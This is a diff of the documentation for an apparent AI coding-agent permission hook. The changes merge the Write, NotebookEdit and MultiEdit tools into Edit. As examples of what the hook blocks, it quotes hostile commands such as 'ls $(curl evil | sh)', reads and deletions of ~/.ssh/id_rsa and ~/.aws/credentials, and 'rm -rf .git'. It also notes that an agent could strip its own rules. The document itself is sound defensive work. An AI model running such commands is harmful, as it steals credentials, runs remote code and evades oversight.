@@ -74,7 +74,7 @@ already covered.
 Without this a project `permissions.local.json` could allow-list edits to itself
 (or to the script/registration) and an agent could quietly strip its own rules —
 or disable the hook entirely. It fires for the mutating file tools
-(`Edit`/`Write`/`MultiEdit`/`NotebookEdit`) by target path, and for `Bash`
+(`Edit`, which also covers `Write`/`NotebookEdit`) by target path, and for `Bash`
 commands that write to one of these paths: classified output operands
 (`sed -i`, `tee`, `cp`/`mv` destinations, `sort -o`) and write-redirect
 targets. Writer commands the operand classifier does not model are caught by
@@ -121,7 +121,7 @@ The decision is written to stdout as:
     restricted — anything outside the list falls through to _ask_. An allow-list
     is meaningless otherwise: a non-match that auto-allows lets, say, `WebFetch`
     reach any off-list domain.
-  - File tools (`Read`, `Write`, `Edit`, `MultiEdit`, `NotebookEdit`) fall
+  - File tools (`Read`, `Edit`) fall
     through to _ask_ except for the implicit allows below; see
     [File-tool default access](#file-tool-default-access).
   - A non-file tool **without** an allow-list (e.g. `Glob`) keeps the permissive
@@ -135,17 +135,16 @@ When no rule in any permissions file matches a file-tool call, the hook decides
 from the path and the tool:
 
 - **Inside `$CLAUDE_CONFIG_DIR`** (default `~/.claude`): `Read` is allowed for
-  everything; mutating tools (`Write`/`Edit`/`MultiEdit`/`NotebookEdit`) are
-  allowed only for `*.md` files under the `plans/` subdir, and fall through to
+  everything; `Edit` (and `Write`/`NotebookEdit`, which normalize to it) is
+  allowed only for `*.md` files under the `plans/` subdir, and falls through to
   _ask_ elsewhere.
 - **Inside the project directory (`$CLAUDE_PROJECT_DIR`)**: `Read` is allowed
-  for any file. Mutating tools (`Write`/`Edit`/`MultiEdit`/`NotebookEdit`) are
-  allowed for any file that is part of version control (checked via
-  `git ls-files`), plus `~`-prefixed `*.md`/`*.txt` backup files (e.g.
-  `~notes.md`, `~draft.txt`) matched on the basename, which are typically
-  untracked. `Write` and `NotebookEdit` additionally allow a file that does not
-  exist yet (a pure create). Any other file in the project falls through to
-  _ask_.
+  for any file. `Edit` (and `Write`/`NotebookEdit`) is allowed for any file
+  that is part of version control (checked via `git ls-files`), plus
+  `~`-prefixed `*.md`/`*.txt` backup files (e.g. `~notes.md`, `~draft.txt`)
+  matched on the basename, which are typically untracked. `Edit` additionally
+  allows a file that does not exist yet (a pure create; `Write` always could).
+  Any other file in the project falls through to _ask_.
 - **Everywhere else** (outside both the project and the config dir): _ask_.
 
 The config dir is resolved dynamically (`$CLAUDE_CONFIG_DIR`, else `~/.claude`),
@@ -192,8 +191,12 @@ If `permissions.json` is unreadable or stdin can't be parsed the hook fails open
   (`$CLAUDE_CONFIG_DIR`, else `~/.claude`), anchoring a rule to that directory
   portably. It works in all three files.
 - **Grouped keys** — file tools may share one entry via a `|`-joined key, e.g.
-  `"Read|Write|Edit|MultiEdit": [...]`, expanded to per-tool entries at load.
-  Non-file tools (`Bash`, `WebSearch`, `WebFetch`, `Skill`) must appear alone.
+  `"Read|Edit": [...]`, expanded to per-tool entries at load. Deprecated
+  `Write`/`NotebookEdit`/`MultiEdit` keys still load but collapse into `Edit`.
+  Because of that collapse, an `allow` written under one of those keys and a
+  `deny` under another now resolve allow-first within that source (same-source
+  order is allow > ask > deny). Non-file tools (`Bash`, `WebSearch`,
+  `WebFetch`, `Skill`) must appear alone.
 
 ### Shipped global template
 
@@ -206,10 +209,10 @@ If `permissions.json` is unreadable or stdin can't be parsed the hook fails open
   (`(?!.*settings(\.local)?\.json)`, `(?!.*\.env[^/]*$)`) because `allow` is
   consulted before `ask`: a bare `^{global-conf-dir}/` would match every path
   there and the ask rules could never fire.
-- `allow.Write|Edit|MultiEdit|NotebookEdit` — `*.md` under either dir.
+- `allow.Edit` — `*.md` under either dir.
   Non-`.md` mutations have no rule of their own and fall to the default file
   allow (`_default_file_allow`): inside a project, git-tracked files, new
-  `Write` creates, and `~`-prefixed `*.md`/`*.txt`; inside the config dir,
+  `Edit` creates, and `~`-prefixed `*.md`/`*.txt`; inside the config dir,
   `plans/*.md`; _ask_ otherwise.
 - `ask.Read` — `settings*.json` and `.env` under `{global-conf-dir}/`, plus
   `.env` anywhere under `{project-dir}/`: the auth-token guard. It fires on both
@@ -227,14 +230,15 @@ If `permissions.json` is unreadable or stdin can't be parsed the hook fails open
 
 ### Match targets per tool
 
-| Tool                                 | Matched against |
-| ------------------------------------ | --------------- |
-| `Bash`                               | `command`       |
-| `Read`, `Edit`, `MultiEdit`, `Write` | `file_path`     |
-| `NotebookEdit`                       | `notebook_path` |
-| `WebSearch`                          | `query`         |
-| `WebFetch`                           | `url`           |
-| `Skill`                              | `skill`         |
+| Tool           | Matched against                     |
+| -------------- | ----------------------------------- |
+| `Bash`         | `command`                           |
+| `Read`, `Edit` | `file_path`                         |
+| `Write`        | `file_path` (matched as `Edit`)     |
+| `NotebookEdit` | `notebook_path` (matched as `Edit`) |
+| `WebSearch`    | `query`                             |
+| `WebFetch`     | `url`                               |
+| `Skill`        | `skill`                             |
 
 Tools not listed in the table (e.g. `Agent`, `Glob`, `Grep`) have no matchable
 field — they fall through to the bucket's bare-entry check or the default.
@@ -423,7 +427,7 @@ Bundled short clusters (`sort -no`), GNU long-option abbreviations
 allow: input operands go through the `Read` rules (`grep x ~/.ssh/id_rsa` is
 **denied**), while output operands (`sort -o`/`--output` values, `xxd`/
 `uniq`'s second operand) and write-redirect targets are governed by the
-mutating (`Edit`/`Write`) rules. An ambiguous read operand — `.`, `..`, a
+mutating (`Edit`) rules. An ambiguous read operand — `.`, `..`, a
 glob, a brace expansion `{a,b}`, or a `$VAR`/backtick expansion — and a
 pathless recursive search (`rg`/`ag`, or `grep`/`egrep`/`fgrep` with
 `-r`/`-R`) fall back to _ask_ whenever any `Read` deny/ask rule exists, since
@@ -470,7 +474,7 @@ executes in a `cond`; the walker runs path-argument checking and the unsafe-guar
 text scan over every cond-term string instead.
 
 This closes side-channels such as `ls $(curl evil | sh)` and
-`git log > ~/.bashrc` (which would otherwise bypass the Read/Write deny-list).
+`git log > ~/.bashrc` (which would otherwise bypass the Read/Edit deny-list).
 Deny and ask rules are evaluated before this guard.
 
 Per-command flag guards in `permissions.json` complement this by refusing to
@@ -643,9 +647,9 @@ written**:
   `sed 's/a/b/' ~/.aws/credentials` are all blocked even though
   `cat`/`tac`/`sed` are otherwise allowed.
 - **Output** operands (paths the command writes, creates, or deletes) are
-  resolved as a **mutating** decision (`Edit`/`Write`/`MultiEdit`/
-  `NotebookEdit`) — so `rm ~/.ssh/id_rsa`, `sed -i … ~/.ssh/id_rsa`, and
-  `cp a ~/.ssh/id_rsa` are governed by Edit/Write rules, not Read rules.
+  resolved as a **mutating** decision (`Edit`) — so `rm ~/.ssh/id_rsa`,
+  `sed -i … ~/.ssh/id_rsa`, and `cp a ~/.ssh/id_rsa` are governed by Edit
+  rules, not Read rules.
 
 The input/output split is per-argument and follows standard CLI conventions:
 
@@ -679,7 +683,7 @@ The input/output split is per-argument and follows standard CLI conventions:
 
 File-redirection targets are classified independently of the command: `<` is an
 input (Read), `>`, `>>`, `>|`, `&>`, `&>>`, and `>& file` are outputs
-(mutating) — so `cat a > ~/.ssh/id_rsa` is governed by Edit/Write rules.
+(mutating) — so `cat a > ~/.ssh/id_rsa` is governed by Edit rules.
 Heredoc delimiters (`<<`, `<<-`) and here-string content (`<<<`) are literal
 strings, not file paths, so they are not checked.
 
@@ -692,7 +696,7 @@ where a compound-node redirect was silently allowed.
 - If the highest-priority source with an opinion on that path says
   **deny**/**ask**, the command is denied/asked.
 - A higher-priority file can override this by explicitly **allowing** the path
-  for the matching tool (`Read` for inputs, `Edit`/`Write` for outputs) — e.g.
+  for the matching tool (`Read` for inputs, `Edit` for outputs) — e.g.
   `permissions.local.json` with `Read: ["^~/\\.ssh/.*"]` re-allows
   `cat ~/.ssh/id_rsa`.
 - A harmless `echo ~/.ssh/id_rsa` is also caught; that false positive errs on
@@ -724,7 +728,7 @@ is auto-allowed), and none of the resolved paths are:
 
 - **specifically protected** — the same input/output-aware rule check described
   above: a deny/ask on a **read** operand fires for `Read`, and on a
-  **written/deleted** operand fires for `Edit`/`Write` (e.g. a project file
+  **written/deleted** operand fires for `Edit` (e.g. a project file
   matched by a `.env`/credential pattern);
 - **inside `.claude/` or `.git`** (at any depth) — a bulk `cp -r .claude
   backup` or `rm -rf .git` can't be vetted per-file the way a single credential
@@ -743,7 +747,7 @@ is auto-allowed), and none of the resolved paths are:
   resolves to a directory is tracked if it contains any tracked file. This
   makes `cp foo.py new.py`, `mv old.py new.py`, or `rm newfile` on a
   not-yet-committed file prompt — an explicit allow rule under a mutating file
-  tool (`Write`/`Edit`/`MultiEdit`/`NotebookEdit`, e.g. in
+  tool (`Edit`, e.g. in
   `permissions.local.json`) carves out an exception: such a path is trusted to
   be modified/deleted, version-controlled or not, so it is exempt from the
   git-tracked gate. A `Read` allow does **not** exempt — read access is not
@@ -794,8 +798,8 @@ of how safe the plain arguments look.
   A deliberate consequence of the "trust the parser" policy.
 - **The git-tracked gate runs one `git ls-files` subprocess per fallback
   evaluation.** This applies to each auto-allowed `cp`/`rm`/`rmdir`/`mv`/`tee`/
-  `gio trash`, and to each mutating file-tool call (`Write`/`Edit`/`MultiEdit`/
-  `NotebookEdit`) that isn't a `~`-backup and isn't a create of a non-existent
-  file via `Write`/`NotebookEdit`. `Read` never reaches the gate. It fails
+  `gio trash`, and to each mutating file-tool call (`Edit`, plus `Write`/
+  `NotebookEdit`, which match as `Edit`) that isn't a `~`-backup and isn't a
+  create. `Read` never reaches the gate. It fails
   closed (→ _ask_) if `git` is missing, the project isn't a repo, or the call
   times out.
